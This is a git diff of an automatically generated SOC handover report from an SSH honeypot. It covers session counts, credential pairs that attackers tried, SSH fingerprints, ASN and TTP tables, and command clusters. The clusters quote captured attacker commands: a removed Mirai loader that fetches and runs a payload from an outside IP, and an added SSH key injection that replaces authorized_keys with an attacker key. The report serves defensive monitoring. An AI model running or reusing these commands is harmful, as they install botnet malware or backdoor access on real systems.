@@ -3,8 +3,8 @@
 | Field | Value |
 |---|---|
 | **Report Date** | 2026-08-24 |
-| **Generated At** | 2026-08-24T18:44:59Z |
-| **Shift Time** | 18:44 UTC |
+| **Generated At** | 2026-08-24T20:36:06Z |
+| **Shift Time** | 20:36 UTC |
 | **Honeypot Status** | ✅ HEALTHY |
 | **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |
 
@@ -14,14 +14,14 @@
 
 | Metric | Value |
 |---|---|
-| Total Sessions Captured | **158** |
+| Total Sessions Captured | **153** |
 | Confirmed Threats | **0** |
-| False Positives Filtered | **158** (100.0%) |
-| Unique Attacker IPs | **62** |
+| False Positives Filtered | **153** (100.0%) |
+| Unique Attacker IPs | **69** |
 | Countries of Origin | **0** |
-| High Severity Cases | **105** |
+| High Severity Cases | **77** |
 | Medium Severity Cases | **0** |
-| Low Severity Cases | **53** |
+| Low Severity Cases | **76** |
 | Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |
 
 ---
@@ -30,157 +30,132 @@
 
 | Metric | Value |
 |---|---|
-| Total Auth Attempts | **121** |
-| Unique Credential Pairs | **84** |
-| Unique Usernames | **11** |
-| Unique Passwords | **83** |
-| Successful Auth Pairs | **111** |
+| Total Auth Attempts | **104** |
+| Unique Credential Pairs | **52** |
+| Unique Usernames | **17** |
+| Unique Passwords | **51** |
+| Successful Auth Pairs | **86** |
 
 **Top Usernames:**
 
 | Username | Attempts |
 |---|---|
-| `root` | 63 |
-| `ubuntu` | 13 |
-| `admin` | 9 |
-| `operator` | 8 |
-| `user` | 7 |
+| `root` | 25 |
+| `user` | 17 |
+| `ubuntu` | 12 |
+| `support` | 10 |
+| `debian` | 8 |
 
 **Top Passwords:**
 
 | Password | Attempts |
 |---|---|
-| `9999` | 5 |
-| `test888` | 4 |
-| `22` | 4 |
-| `` | 4 |
-| `default666` | 4 |
+| `support222` | 6 |
+| `9999999` | 6 |
+| `55` | 6 |
+| `2` | 6 |
+| `777777` | 5 |
 
 **Top Credential Pairs:**
 
 | Username | Password | Attempts |
 |---|---|---|
-| `admin` | `9999` | 5 |
-| `test` | `test888` | 4 |
-| `user` | `22` | 4 |
-| `root` | `` | 4 |
-| `default` | `default666` | 4 |
+| `support` | `support222` | 6 |
+| `user` | `9999999` | 6 |
+| `admin` | `55` | 6 |
+| `user` | `2` | 6 |
+| `user` | `777777` | 5 |
 
 **⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**
 
 | Username | Password | Source IP | Timestamp |
 |---|---|---|---|
-| `root` | `123456789` | `92.118.39.71` | 2026-08-24T14:56:09 |
-| `root` | `1234abcd` | `92.118.39.71` | 2026-08-24T14:58:17 |
-| `ubuntu` | `test123@` | `217.60.255.130` | 2026-08-24T14:59:04 |
-| `root` | `Seyed123` | `217.60.255.130` | 2026-08-24T14:59:07 |
-| `root` | `123abc` | `92.118.39.71` | 2026-08-24T15:00:23 |
-| `debian` | `111` | `60.166.8.174` | 2026-08-24T15:01:53 |
-| `debian` | `111` | `113.11.34.221` | 2026-08-24T15:02:03 |
-| `root` | `123qwe` | `92.118.39.71` | 2026-08-24T15:02:32 |
-| `root` | `1q2w3e` | `92.118.39.71` | 2026-08-24T15:04:45 |
-| `root` | `1q2w3e4r` | `92.118.39.71` | 2026-08-24T15:06:52 |
-| `ubuntu` | `!qaz2wsx` | `217.60.255.130` | 2026-08-24T15:08:49 |
-| `root` | `tehran123` | `217.60.255.130` | 2026-08-24T15:08:53 |
-| `root` | `1qaz2wsx` | `92.118.39.71` | 2026-08-24T15:08:55 |
-| `root` | `654321` | `92.118.39.71` | 2026-08-24T15:10:58 |
-| `ubnt` | `222222` | `220.163.252.244` | 2026-08-24T15:12:12 |
-| `ubnt` | `222222` | `179.185.227.77` | 2026-08-24T15:12:22 |
-| `admin` | `admin` | `88.151.33.203` | 2026-08-24T15:12:43 |
-| `root` | `P@ssw0rd` | `92.118.39.71` | 2026-08-24T15:12:59 |
-| `root` | `P@ssword` | `92.118.39.71` | 2026-08-24T15:15:01 |
-| `user` | `44444` | `195.222.57.183` | 2026-08-24T15:15:27 |
-| `root` | `Root123` | `92.118.39.71` | 2026-08-24T15:17:02 |
-| `test` | `test888` | `10.0.0.73` | 2026-08-24T15:18:07 |
-| `ubuntu` | `Blackberry1` | `217.60.255.130` | 2026-08-24T15:18:24 |
-| `root` | `Zavosh@123` | `217.60.255.130` | 2026-08-24T15:18:28 |
-| `root` | `admin` | `92.118.39.71` | 2026-08-24T15:19:07 |
-| `root` | `admin123` | `92.118.39.71` | 2026-08-24T15:21:20 |
-| `root` | `letmein` | `92.118.39.71` | 2026-08-24T15:23:34 |
-| `root` | `passw0rd` | `92.118.39.71` | 2026-08-24T15:25:53 |
-| `user` | `22` | `10.0.0.73` | 2026-08-24T15:26:54 |
-| `ubuntu` | `1234qwer` | `217.60.255.130` | 2026-08-24T15:27:44 |
-| `root` | `Adnan@123` | `217.60.255.130` | 2026-08-24T15:27:49 |
-| `root` | `password` | `92.118.39.71` | 2026-08-24T15:28:11 |
-| `root` | `password1` | `92.118.39.71` | 2026-08-24T15:30:43 |
-| `user` | `44444` | `2.180.15.240` | 2026-08-24T15:30:50 |
-| `user` | `44444` | `59.95.137.64` | 2026-08-24T15:30:58 |
-| `root` | `qwerty` | `92.118.39.71` | 2026-08-24T15:33:06 |
-| `test` | `test888` | `201.28.176.31` | 2026-08-24T15:34:28 |
-| `test` | `test888` | `62.192.226.83` | 2026-08-24T15:34:36 |
-| `root` | `r00t` | `92.118.39.71` | 2026-08-24T15:35:02 |
-| `ubuntu` | `1q2w3e4r.` | `217.60.255.130` | 2026-08-24T15:37:32 |
-| `root` | `Boss@123` | `217.60.255.130` | 2026-08-24T15:37:35 |
-| `root` | `root!@#` | `92.118.39.71` | 2026-08-24T15:39:13 |
-| `default` | `default666` | `212.174.62.233` | 2026-08-24T15:39:31 |
-| `root` | `root#123` | `92.118.39.71` | 2026-08-24T15:41:15 |
-| `root` | `root0000` | `92.118.39.71` | 2026-08-24T15:43:20 |
-| `user` | `22` | `218.23.95.14` | 2026-08-24T15:44:33 |
-| `user` | `22` | `37.57.158.182` | 2026-08-24T15:44:43 |
-| `root` | `root1111` | `92.118.39.71` | 2026-08-24T15:45:18 |
-| `root` | `root123` | `92.118.39.71` | 2026-08-24T15:47:11 |
-| `ubuntu` | `Asdf1234` | `217.60.255.130` | 2026-08-24T15:47:29 |
-| `root` | `Arvan@123` | `217.60.255.130` | 2026-08-24T15:47:35 |
-| `centos` | `centos999` | `90.70.76.142` | 2026-08-24T15:47:47 |
-| `centos` | `centos999` | `181.129.31.42` | 2026-08-24T15:47:54 |
-| `root` | `root1234` | `92.118.39.71` | 2026-08-24T15:49:06 |
-| `default` | `default666` | `10.0.0.73` | 2026-08-24T15:50:28 |
-| `root` | `root2024` | `92.118.39.71` | 2026-08-24T15:51:07 |
-| `root` | `root2025` | `92.118.39.71` | 2026-08-24T15:53:09 |
-| `root` | `root2222` | `92.118.39.71` | 2026-08-24T15:55:20 |
-| `ubuntu` | `ab@123` | `217.60.255.130` | 2026-08-24T15:56:51 |
-| `root` | `Saber@1234` | `217.60.255.130` | 2026-08-24T15:56:56 |
-| `root` | `root4444` | `92.118.39.71` | 2026-08-24T15:57:39 |
-| `operator` | `operator2023` | `10.0.0.73` | 2026-08-24T15:59:16 |
-| `root` | `root5555` | `92.118.39.71` | 2026-08-24T16:00:06 |
-| `root` | `root5678` | `92.118.39.71` | 2026-08-24T16:02:36 |
-| `centos` | `centos999` | `218.94.115.164` | 2026-08-24T16:03:26 |
-| `centos` | `centos999` | `116.7.248.50` | 2026-08-24T16:03:36 |
-| `root` | `root6666` | `92.118.39.71` | 2026-08-24T16:04:37 |
-| `support` | `support` | `176.53.159.196` | 2026-08-24T16:04:50 |
-| `ubuntu` | `postgres2024` | `217.60.255.130` | 2026-08-24T16:06:23 |
-| `root` | `arman123` | `217.60.255.130` | 2026-08-24T16:06:27 |
-| `root` | `root9999` | `92.118.39.71` | 2026-08-24T16:06:41 |
-| `default` | `default666` | `34.146.248.7` | 2026-08-24T16:07:03 |
-| `default` | `default666` | `125.36.68.227` | 2026-08-24T16:07:12 |
-| `root` | `root@123` | `92.118.39.71` | 2026-08-24T16:08:42 |
-| `root` | `rootaccess` | `92.118.39.71` | 2026-08-24T16:10:42 |
-| `admin` | `9999` | `211.178.165.251` | 2026-08-24T16:11:56 |
-| `root` | `﻿------fuck------` | `4.172.218.10` | 2026-08-24T16:11:59 |
-| `admin` | `9999` | `2.180.15.240` | 2026-08-24T16:12:05 |
-| `root` | `rootadmin` | `92.118.39.71` | 2026-08-24T16:12:41 |
-| `root` | `rootme` | `92.118.39.71` | 2026-08-24T16:14:40 |
-| `ubuntu` | `ABcd1234` | `217.60.255.130` | 2026-08-24T16:16:02 |
-| `root` | `123@qaz` | `217.60.255.130` | 2026-08-24T16:16:05 |
-| `root` | `rootpass` | `92.118.39.71` | 2026-08-24T16:16:35 |
-| `operator` | `operator2023` | `223.241.214.127` | 2026-08-24T16:17:06 |
-| `operator` | `operator2023` | `181.129.31.42` | 2026-08-24T16:17:13 |
-| `operator` | `operator2023` | `83.177.240.182` | 2026-08-24T16:17:16 |
-| `root` | `rootpw` | `92.118.39.71` | 2026-08-24T16:18:30 |
-| `admin` | `88888` | `10.0.0.73` | 2026-08-24T16:18:51 |
-| `admin` | `88888` | `203.252.10.4` | 2026-08-24T16:20:19 |
-| `admin` | `88888` | `101.13.1.58` | 2026-08-24T16:20:29 |
-| `admin` | `9999` | `10.0.0.73` | 2026-08-24T16:23:15 |
-| `ubuntu` | `abcd1234.` | `217.60.255.130` | 2026-08-24T16:25:23 |
-| `root` | `QWE123qwe` | `217.60.255.130` | 2026-08-24T16:25:27 |
-| `support` | `support` | `10.0.0.73` | 2026-08-24T16:29:35 |
-| `ubuntu` | `Abcd.123` | `217.60.255.130` | 2026-08-24T16:35:01 |
-| `root` | `q@123456` | `217.60.255.130` | 2026-08-24T16:35:04 |
-| `admin` | `9999` | `78.72.168.178` | 2026-08-24T16:39:21 |
-| `admin` | `9999` | `95.174.100.64` | 2026-08-24T16:39:30 |
-| `ubuntu` | `.` | `217.60.255.130` | 2026-08-24T16:44:30 |
-| `root` | `Mamad1234` | `217.60.255.130` | 2026-08-24T16:44:34 |
-| `root` | `admin` | `45.198.224.26` | 2026-08-24T16:48:53 |
-| `test` | `22222` | `181.87.154.121` | 2026-08-24T16:49:11 |
-| `test` | `22222` | `196.188.187.85` | 2026-08-24T16:49:20 |
-| `test` | `22222` | `203.252.10.4` | 2026-08-24T16:49:29 |
-| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-08-24T16:50:37 |
-| `root` | `123@@@` | `165.1.75.106` | 2026-08-24T16:50:37 |
-| `operator` | `operator111` | `10.0.0.73` | 2026-08-24T16:51:05 |
-| `operator` | `operator111` | `65.109.188.178` | 2026-08-24T16:52:37 |
-| `operator` | `operator111` | `36.137.38.119` | 2026-08-24T16:52:48 |
-| `ubuntu` | `!@#456QWErty` | `217.60.255.130` | 2026-08-24T16:53:49 |
-| `root` | `Vahid123` | `217.60.255.130` | 2026-08-24T16:53:53 |
+| `default` | `default88` | `10.0.0.73` | 2026-08-24T16:55:20 |
+| `newuser` | `123123` | `24.122.136.94` | 2026-08-24T16:58:11 |
+| `345gs5662d34` | `345gs5662d34` | `24.122.136.94` | 2026-08-24T16:58:13 |
+| `newuser` | `3245gs5662d34` | `24.122.136.94` | 2026-08-24T16:58:13 |
+| `ubuntu` | `q1w2e3r4t5` | `217.60.255.130` | 2026-08-24T17:03:21 |
+| `root` | `abc123!` | `217.60.255.130` | 2026-08-24T17:03:24 |
+| `user` | `777777` | `10.0.0.73` | 2026-08-24T17:03:58 |
+| `support` | `support` | `176.53.159.196` | 2026-08-24T17:04:54 |
+| `operator` | `operator111` | `178.178.194.123` | 2026-08-24T17:07:54 |
+| `default` | `default88` | `196.216.81.126` | 2026-08-24T17:11:36 |
+| `default` | `default88` | `103.83.23.169` | 2026-08-24T17:11:44 |
+| `ubuntu` | `1Qaz2wsx` | `217.60.255.130` | 2026-08-24T17:12:53 |
+| `root` | `asiatech1234` | `217.60.255.130` | 2026-08-24T17:12:58 |
+| `root` | `Naruto123` | `101.96.193.131` | 2026-08-24T17:13:35 |
+| `345gs5662d34` | `345gs5662d34` | `101.96.193.131` | 2026-08-24T17:13:39 |
+| `root` | `3245gs5662d34` | `101.96.193.131` | 2026-08-24T17:13:41 |
+| `test` | `333333` | `65.20.143.19` | 2026-08-24T17:16:36 |
+| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-24T17:17:22 |
+| `root` | `123@@@` | `144.22.238.238` | 2026-08-24T17:17:22 |
+| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-24T17:17:27 |
+| `user` | `777777` | `87.103.126.54` | 2026-08-24T17:21:24 |
+| `user` | `777777` | `58.57.154.146` | 2026-08-24T17:21:33 |
+| `user` | `777777` | `65.20.153.146` | 2026-08-24T17:21:37 |
+| `user` | `777777` | `112.28.153.240` | 2026-08-24T17:21:46 |
+| `ubuntu` | `5tgb^YHN` | `217.60.255.130` | 2026-08-24T17:22:13 |
+| `root` | `Siamak@123` | `217.60.255.130` | 2026-08-24T17:22:16 |
+| `support` | `support222` | `10.0.0.73` | 2026-08-24T17:23:17 |
+| `support` | `support222` | `159.224.97.134` | 2026-08-24T17:24:47 |
+| `support` | `support222` | `124.239.129.2` | 2026-08-24T17:24:57 |
+| `test` | `333333` | `10.0.0.73` | 2026-08-24T17:27:28 |
+| `support` | `support` | `10.0.0.73` | 2026-08-24T17:29:42 |
+| `ubuntu` | `Yy123456` | `217.60.255.130` | 2026-08-24T17:31:49 |
+| `root` | `admin@123!` | `217.60.255.130` | 2026-08-24T17:31:53 |
+| `GET / HTTP/1.0` | `Host: 129.80.119.236` | `165.154.29.189` | 2026-08-24T17:35:12 |
+| `USER test` | `USER test` | `165.154.29.189` | 2026-08-24T17:35:24 |
+| `OPTIONS rtsp://129.80.119.236 RTSP/1.0` | `CSeq:1` | `165.154.29.189` | 2026-08-24T17:35:29 |
+| `user` | `9999999` | `10.0.0.73` | 2026-08-24T17:36:11 |
+| `support` | `support222` | `146.158.98.4` | 2026-08-24T17:40:16 |
+| `support` | `support222` | `34.146.217.105` | 2026-08-24T17:40:24 |
+| `ubuntu` | `sa` | `217.60.255.130` | 2026-08-24T17:41:38 |
+| `root` | `!QAZ@2wsx` | `217.60.255.130` | 2026-08-24T17:41:41 |
+| `test` | `333333` | `210.71.208.175` | 2026-08-24T17:43:36 |
+| `test` | `333333` | `45.170.50.2` | 2026-08-24T17:43:44 |
+| `debian` | `22222` | `178.178.194.135` | 2026-08-24T17:48:38 |
+| `debian` | `22222` | `170.233.29.157` | 2026-08-24T17:48:47 |
+| `ubuntu` | `Hallo123` | `217.60.255.130` | 2026-08-24T17:51:15 |
+| `root` | `123@abc` | `217.60.255.130` | 2026-08-24T17:51:19 |
+| `root` | `123@@@` | `64.110.90.250` | 2026-08-24T17:51:53 |
+| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-24T17:51:53 |
+| `user` | `9999999` | `81.215.2.43` | 2026-08-24T17:53:27 |
+| `user` | `9999999` | `222.92.61.242` | 2026-08-24T17:53:37 |
+| `user` | `9999999` | `78.192.21.78` | 2026-08-24T17:53:39 |
+| `user` | `9999999` | `59.120.8.61` | 2026-08-24T17:53:51 |
+| `blank` | `blank444` | `10.0.0.73` | 2026-08-24T17:55:51 |
+| `blank` | `blank444` | `124.133.10.66` | 2026-08-24T17:57:28 |
+| `blank` | `blank444` | `124.239.129.2` | 2026-08-24T17:57:37 |
+| `debian` | `22222` | `10.0.0.73` | 2026-08-24T17:59:21 |
+| `ubuntu` | `Mohammed@123` | `217.60.255.130` | 2026-08-24T18:00:45 |
+| `root` | `shetab@123` | `217.60.255.130` | 2026-08-24T18:00:49 |
+| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `162.216.149.118` | 2026-08-24T18:07:48 |
+| `admin` | `55` | `10.0.0.73` | 2026-08-24T18:08:13 |
+| `ubuntu` | `@dmin@1234` | `217.60.255.130` | 2026-08-24T18:10:14 |
+| `root` | `Nn@123` | `217.60.255.130` | 2026-08-24T18:10:18 |
+| `debian` | `22222` | `189.51.96.71` | 2026-08-24T18:15:49 |
+| `ubuntu` | `qwer!@#$` | `217.60.255.130` | 2026-08-24T18:19:30 |
+| `root` | `boeing747` | `217.60.255.130` | 2026-08-24T18:19:34 |
+| `admin` | `55` | `107.135.117.245` | 2026-08-24T18:25:27 |
+| `admin` | `55` | `210.95.231.219` | 2026-08-24T18:25:36 |
+| `admin` | `55` | `121.159.71.249` | 2026-08-24T18:25:42 |
+| `admin` | `55` | `213.126.221.10` | 2026-08-24T18:25:50 |
+| `user` | `2` | `10.0.0.73` | 2026-08-24T18:28:29 |
+| `ubuntu` | `Alireza@123` | `217.60.255.130` | 2026-08-24T18:29:06 |
+| `root` | `!@#123QWEqwe` | `217.60.255.130` | 2026-08-24T18:29:10 |
+| `user` | `2` | `43.250.106.18` | 2026-08-24T18:30:03 |
+| `user` | `2` | `23.30.11.253` | 2026-08-24T18:30:10 |
+| `debian` | `debian22` | `10.0.0.73` | 2026-08-24T18:31:14 |
+| `root` | `﻿------fuck------` | `120.26.202.34` | 2026-08-24T18:38:08 |
+| `ubuntu` | `Javad@1404` | `217.60.255.130` | 2026-08-24T18:38:47 |
+| `root` | `a1s2d3f4` | `217.60.255.130` | 2026-08-24T18:38:50 |
+| `admin` | `3333` | `10.0.0.73` | 2026-08-24T18:39:57 |
+| `user` | `2` | `189.56.0.19` | 2026-08-24T18:45:35 |
+| `user` | `2` | `49.36.81.138` | 2026-08-24T18:45:44 |
+| `debian` | `debian22` | `172.3.132.73` | 2026-08-24T18:47:35 |
+| `ubuntu` | `Mehrdad@123` | `217.60.255.130` | 2026-08-24T18:48:12 |
+| `root` | `zaq12wsx!` | `217.60.255.130` | 2026-08-24T18:48:15 |
+| `ubnt` | `ubnt333` | `200.222.71.218` | 2026-08-24T18:52:20 |
 
 ---
 
@@ -188,7 +163,7 @@
 
 | Metric | Value |
 |---|---|
-| Total Sessions Parsed | **158** |
+| Total Sessions Parsed | **153** |
 | Sessions with Fingerprint | **12** |
 | Unique HASSH Fingerprints | **12** |
 
@@ -196,34 +171,34 @@
 
 | Client Family | Sessions |
 |---|---|
-| Go SSH scanner | 46 |
-| OpenSSH | 33 |
-| libssh | 32 |
-| Paramiko (Python) | 4 |
-| PuTTY | 1 |
+| OpenSSH | 36 |
+| libssh | 36 |
+| Go SSH scanner | 8 |
+| Paramiko (Python) | 6 |
+| Perl Net::SSH | 1 |
 
 **⚠️ Botnet/Scanner KEX Signatures Detected:**
 
 | HASSH | Signature | Sessions | IPs |
 |---|---|---|---|
-| `2ec37a7cc8da...` | Mirai/variant | 40 | 1 |
-| `acaa53e0a7d7...` | Mirai/variant | 33 | 30 |
-| `419da4c91ddb...` | Modern SSH client | 26 | 1 |
-| `a2de0f306611...` | Mirai/variant | 4 | 1 |
-| `f1e5e9d24e5e...` | Mirai/variant | 2 | 1 |
+| `acaa53e0a7d7...` | Mirai/variant | 34 | 33 |
+| `419da4c91ddb...` | Modern SSH client | 24 | 1 |
+| `f555226df196...` | Mirai/variant | 6 | 2 |
+| `a2de0f306611...` | Mirai/variant | 6 | 2 |
+| `eff4c24daffc...` | Modern SSH client | 2 | 1 |
 
 **Top Fingerprints:**
 
 | HASSH | Client | Sessions | IPs | Botnet Sig |
 |---|---|---|---|---|
-| `2ec37a7cc8da...` | Go SSH scanner | 40 | 1 | Mirai/variant |
-| `acaa53e0a7d7...` | OpenSSH | 33 | 30 | Mirai/variant |
-| `419da4c91ddb...` | libssh | 26 | 1 | Modern SSH client |
+| `acaa53e0a7d7...` | OpenSSH | 34 | 33 | Mirai/variant |
+| `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
+| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
 | `95420f9d932d...` | libssh | 6 | 2 | — |
-| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
+| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
+| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
 | `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
-| `eff4c24daffc...` | Go SSH scanner | 1 | 1 | Modern SSH client |
-| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |
+| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |
 
 ---
 
@@ -231,60 +206,28 @@
 
 | Metric | Value |
 |---|---|
-| Total Command Clusters | **4** |
-| Campaign Clusters | **2** |
+| Total Command Clusters | **5** |
+| Campaign Clusters | **1** |
 | Highest Severity | **HIGH** |
 
 **Active Campaigns:**
 
 | Campaign | Severity | Sessions | IPs | TTPs |
 |---|---|---|---|---|
-| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
-| **Recon Loader Script** | 🟡 MEDIUM | 39 | 1 | `T1082, T1592, T1078, T1083` |
+| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |
 
-**🔴 HIGH · Mirai/IoT Botnet**
+**🔴 HIGH · mdrfckr SSH Key Injection**
 
-> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.
-
-Representative commands:
-```
-(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
-```
-```
-cd /tmp
-```
-```
-wget http://5.182.210.174/ok
-```
-```
-curl -O http://5.182.210.174/ok
-```
-```
-chmod +x ok
-```
-Source IPs: `45.198.224.26`
-
-**🟡 MEDIUM · Recon Loader Script**
-
-> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.
+> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.
 
 Representative commands:
 ```
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
+cd ~; chattr -ia .ssh; lockr -ia .ssh
 ```
 ```
-uname -s -v -n -m 2 > /dev/null
+cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
 ```
-```
-/bin/uname -s -v -n -m 2 > /dev/null
-```
-```
-/usr/bin/uname -s -v -n -m 2 > /dev/null
-```
-```
-busybox uname -s -v -n -m 2 > /dev/null
-```
-Source IPs: `92.118.39.71`
+Source IPs: `101.96.193.131`, `24.122.136.94`
 
 ---
 
@@ -292,8 +235,8 @@ Source IPs: `92.118.39.71`
 
 | Metric | Value |
 |---|---|
-| Total IPs Analysed | **62** |
-| Unique ASNs | **46** |
+| Total IPs Analysed | **69** |
+| Unique ASNs | **51** |
 | High-Risk ASNs | **0** |
 | Anon Infrastructure ASNs | **0** |
 
@@ -301,14 +244,14 @@ Source IPs: `92.118.39.71`
 
 | ASN | Provider | IPs | Risk |
 |---|---|---|---|
-| `AS4134` | CHINANET BACKBONE | 6 | LOW |
 | `AS396982` | Google LLC | 4 | LOW |
-| `AS9829` | National Internet Backbone | 3 | LOW |
-| `AS58224` | Iran Telecommunication Company PJS | 2 | LOW |
-| `AS398324` | Censys, Inc. | 2 | LOW |
-| `AS3301` | Telia Company AB | 2 | LOW |
-| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 2 | LOW |
-| `AS8075` | Microsoft Corporation | 2 | LOW |
+| `AS213412` | ONYPHE SAS | 3 | LOW |
+| `AS398324` | Censys, Inc. | 3 | LOW |
+| `AS4134` | CHINANET BACKBONE | 3 | LOW |
+| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | LOW |
+| `AS3462` | Data Communication Business Group | 2 | LOW |
+| `AS7018` | AT&T Enterprises, LLC | 2 | LOW |
+| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | LOW |
 
 ---
 
@@ -415,19 +358,19 @@ _No enriched IPs with abuse scores available._
 
 | TTP ID | Count |
 |---|---|
-| [T1592](https://attack.mitre.org/techniques/T1592) | 117 |
-| [T1078](https://attack.mitre.org/techniques/T1078) | 105 |
-| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 42 |
-| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 40 |
-| [T1083](https://attack.mitre.org/techniques/T1083) | 39 |
+| [T1592](https://attack.mitre.org/techniques/T1592) | 87 |
+| [T1078](https://attack.mitre.org/techniques/T1078) | 77 |
+| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |
+| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 2 |
+| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
 
 ---
 
-## 🔕 False Positive Summary (158 filtered)
+## 🔕 False Positive Summary (153 filtered)
 
 | Reason | Count |
 |---|---|
-| AbuseIPDB score 0 below threshold 25 | 158 |
+| AbuseIPDB score 0 below threshold 25 | 153 |
 
 > FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.
 
@@ -438,14 +381,14 @@ _No enriched IPs with abuse scores available._
 | Tool | Role | Status |
 |---|---|---|
 | Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
-| Tool 26  | Incident Timeline Generator | ✅ 158 cases |
-| Tool 34  | Credential Extractor        | ✅ 121 attempts |
+| Tool 26  | Incident Timeline Generator | ✅ 153 cases |
+| Tool 34  | Credential Extractor        | ✅ 104 attempts |
 | Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
-| Tool 36  | Command Clustering          | ✅ 4 clusters |
-| Tool 27  | Threat Intel Feeder         | ✅ 62 IPs enriched |
-| Tool 29  | False Positive Tracker      | ✅ 158 filtered (100.0%) |
+| Tool 36  | Command Clustering          | ✅ 5 clusters |
+| Tool 27  | Threat Intel Feeder         | ✅ 69 IPs enriched |
+| Tool 29  | False Positive Tracker      | ✅ 153 filtered (100.0%) |
 | Tool 30  | Metric Exporter             | ✅ stats.json written |
-| Tool 30b | ASN Clustering              | ✅ 46 ASNs |
+| Tool 30b | ASN Clustering              | ✅ 51 ASNs |
 | Tool 31  | Malware Analyzer            | ✅ 49 files |
 | Tool 33  | YARA Classifier             | ✅ 17 classified |
 | Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |
@@ -485,4 +428,4 @@ _No enriched IPs with abuse scores available._
 
 _Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
 _Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
-_Report time: 2026-08-24T18:44:59Z_
+_Report time: 2026-08-24T20:36:06Z_
